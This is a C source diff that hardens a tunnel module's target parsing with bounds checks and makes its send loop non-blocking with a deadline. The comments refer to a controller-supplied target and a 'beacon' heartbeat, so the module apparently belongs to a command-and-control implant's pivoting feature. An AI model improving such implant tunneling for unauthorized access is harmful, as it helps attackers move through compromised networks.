@@ -10,7 +10,9 @@
 static INT TunnelSplitTarget(const CHAR* target, CHAR* host, SIZE_T host_len, CHAR* service, SIZE_T service_len)
 {
     const CHAR* colon;
+    const CHAR* svc;
     SIZE_T len;
+    SIZE_T svc_len;
 
     if (!target || !target[0]) {
         return 0;
@@ -23,13 +25,19 @@ static INT TunnelSplitTarget(const CHAR* target, CHAR* host, SIZE_T host_len, CH
             return 0;
         }
         len = (SIZE_T)(end - target - 1);
+        svc = end + 2;
+        /* 显式边界检查：target 来自控制端，strcpy_s 超限会触发 CRT fail-fast */
         if (len + 1 > host_len) {
+            return 0;
+        }
+        svc_len = strlen(svc);
+        if (svc_len == 0 || svc_len + 1 > service_len) {
             return 0;
         }
         memcpy(host, target + 1, len);
         host[len] = 0;
-        strcpy_s(service, service_len, end + 2);
-        return service[0] != 0;
+        memcpy(service, svc, svc_len + 1);
+        return 1;
     }
 
     /* 处理 host:port 表示法 */
@@ -38,13 +46,24 @@ static INT TunnelSplitTarget(const CHAR* target, CHAR* host, SIZE_T host_len, CH
         return 0;
     }
     len = (SIZE_T)(colon - target);
+    svc = colon + 1;
     if (len + 1 > host_len) {
+        return 0;
+    }
+    svc_len = strlen(svc);
+    if (svc_len + 1 > service_len) {
         return 0;
     }
     memcpy(host, target, len);
     host[len] = 0;
-    strcpy_s(service, service_len, colon + 1);
+    memcpy(service, svc, svc_len + 1);
     return 1;
+}
+
+INT TunnelTestSplitTarget(const CHAR* target, CHAR* host, SIZE_T host_len,
+                          CHAR* service, SIZE_T service_len)
+{
+    return TunnelSplitTarget(target, host, host_len, service, service_len);
 }
 
 /* 使用非阻塞套接字和 select() 进行带超时的连接 */
@@ -167,17 +186,68 @@ SOCKET TunnelDialTarget(const TunnelStartRequest* req, INT* reason)
     return connected;
 }
 
-/* 在套接字上发送所有数据，根据需要重试。成功返回 1 */
+/* 下行发送默认 deadline（ms）：防止零窗口/半开连接把主循环卡在 send 上分钟级 */
+#define TUNNEL_SEND_DEADLINE_MS (30 * 1000)
+
+/*
+ * 在套接字上发送全部数据；成功返回 1，超时或错误返回 0。
+ *
+ * 该函数在主循环线程上执行（TunnelHandleData 转发下行数据），因此不能用
+ * 阻塞式 send：目标零窗口或半开连接时会无限期冻结整个 beacon 心跳。实现为
+ * 非阻塞分段发送 + select 等待可写，总时长受 TUNNEL_SEND_DEADLINE_MS 约束；
+ * 单片等待上限 10s，超时即放弃并让上层走 close 流程。
+ */
 INT TunnelSendAll(SOCKET s, const BYTE8* data, SIZE_T len)
 {
+    u_long nonblock = 1;
+    u_long blocking = 0;
     SIZE_T sent_total = 0;
+    ULONGLONG deadline = GetTickCount64() + TUNNEL_SEND_DEADLINE_MS;
+
+    if (s == INVALID_SOCKET || (!data && len > 0)) {
+        return 0;
+    }
+
+    ioctlsocket(s, FIONBIO, &nonblock);
+
     while (sent_total < len) {
-        INT chunk = (INT)((len - sent_total) > 32768 ? 32768 : (len - sent_total));
-        INT n = send(s, (const CHAR*)data + sent_total, chunk, 0);
+        fd_set write_set;
+        TIMEVAL tv;
+        DWORD wait_ms;
+        INT n;
+
+        /* 整体 deadline 检查：剩余预算决定单片 select 等待时长（≤10s） */
+        ULONGLONG now = GetTickCount64();
+        if (now >= deadline) {
+            ioctlsocket(s, FIONBIO, &blocking);
+            return 0;
+        }
+        wait_ms = (DWORD)(deadline - now);
+        if (wait_ms > 10 * 1000) {
+            wait_ms = 10 * 1000;
+        }
+
+        FD_ZERO(&write_set);
+        FD_SET(s, &write_set);
+        tv.tv_sec = wait_ms / 1000;
+        tv.tv_usec = (wait_ms % 1000) * 1000;
+        if (select(0, NULL, &write_set, NULL, &tv) <= 0) {
+            continue; /* 超时/错误：回到循环头检查总体 deadline */
+        }
+
+        n = send(s, (const CHAR*)data + sent_total,
+                 (INT)((len - sent_total) > 32768 ? 32768 : (len - sent_total)), 0);
         if (n == SOCKET_ERROR || n == 0) {
+            INT err = WSAGetLastError();
+            if (n == SOCKET_ERROR && err == WSAEWOULDBLOCK) {
+                continue; /* 窗口暂满，等下一轮 select */
+            }
+            ioctlsocket(s, FIONBIO, &blocking);
             return 0;
         }
         sent_total += (SIZE_T)n;
     }
+
+    ioctlsocket(s, FIONBIO, &blocking);
     return 1;
 }
